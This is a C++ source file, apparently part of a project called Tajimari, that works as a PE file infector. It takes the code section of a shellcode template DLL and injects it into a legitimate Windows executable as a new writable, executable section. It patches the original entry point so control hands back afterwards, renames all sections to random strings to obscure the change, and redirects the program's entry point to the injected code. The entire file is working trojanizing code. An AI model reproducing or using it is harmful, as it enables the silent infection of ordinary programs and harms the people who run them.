#include "stdafx.h"

std::string
GenerateRandomString(
	size_t count
)
{
	const std::string in = R"(abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !"#$%&'()*+,-./:;<=>?@)";
	std::string out;
	out.clear();
	out.push_back('.');
	std::sample(in.cbegin(), in.cend(), std::back_inserter(out),
		count, std::mt19937{ std::random_device{}() });

	return out;
}

int
main(
	uint16_t argc,
	char** argv
)
{
	spdlog::set_level(spdlog::level::debug);

	auto shellcodeObj = LIEF::PE::Parser::parse(R"(F:\CodeSpace\Tajimari\Build\ShellcodeTemplate\Debug\x64\ShellcodeTemplate.dll)");
	auto targetObj = LIEF::PE::Parser::parse(R"(E:\dllexp-x64\dllexp.exe)");
	auto oldEntryPoint = targetObj->entrypoint();
	auto secInfected = shellcodeObj->get_section(".text");
	uint32_t codeOffset = 0;
	uint32_t entryOffset = 0;
	uint32_t newEntryPoint = 0;
	LIEF::PE::Section newSection;
	LIEF::span<const uint8_t> tempData;
	std::vector<uint8_t> data;
	auto imageBase = targetObj->imagebase();

	if (secInfected == nullptr) {
		spdlog::error("Shellcode template file not correct!");
		return 0;
	}

	spdlog::info("Originally entry point: {:#x}", oldEntryPoint - imageBase);

	for (auto& func : shellcodeObj->get_export().entries()) {
		if (func.name() == "main") {
			codeOffset = func.function_rva() - secInfected->virtual_address();
			spdlog::info("Infected func: {:#x}, offset of text: {:#x}", func.function_rva(), codeOffset);
		}

		if (func.name() == "OriginalEntryPoint") {
			entryOffset = func.function_rva() - secInfected->virtual_address();
			spdlog::info("OriginalEntryPoint variable: {:#x}, offset of text: {:#x}", func.function_rva(), codeOffset);
		}
	}

	tempData = secInfected->content();
	std::copy(tempData.begin(), tempData.end(), std::back_inserter(data));
	*(uint64_t*)(data.data() + entryOffset) = oldEntryPoint;
	newSection.content(data);
	newSection.add_characteristic(
		LIEF::PE::SECTION_CHARACTERISTICS::IMAGE_SCN_MEM_EXECUTE |
		LIEF::PE::SECTION_CHARACTERISTICS::IMAGE_SCN_MEM_READ |
		LIEF::PE::SECTION_CHARACTERISTICS::IMAGE_SCN_MEM_WRITE
	);

	for (auto& sec : targetObj->sections()) {
		sec.name(GenerateRandomString(4));
	}

	newSection.name(GenerateRandomString(4));

	auto secAdded = targetObj->add_section(newSection);
	newEntryPoint = secAdded->virtual_address() + codeOffset;
	targetObj->optional_header().addressof_entrypoint(newEntryPoint);

	spdlog::info("New entry point: {:#x}", newEntryPoint);

	LIEF::PE::Builder builder = *targetObj;
	builder.build();
	builder.write(R"(F:\CodeSpace\Tajimari\Build\Tajimari\Debug\x64\Modified.exe)");

	return 0;
}
